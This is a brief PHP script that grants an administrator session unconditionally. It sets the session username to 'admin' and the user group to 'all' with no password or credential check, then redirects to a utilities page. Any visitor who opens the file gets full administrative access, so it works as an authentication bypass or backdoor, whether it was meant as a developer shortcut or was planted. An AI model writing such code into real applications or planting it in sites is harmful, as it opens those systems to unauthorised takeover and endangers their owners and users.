<?php
if(!isset($_SESSION)) session_start();
$_SESSION['MM_Username']='admin';
$_SESSION['MM_UserGroup']='all';
header("Location: ../../Utilities/PagesIndex.php");
exit;
?>
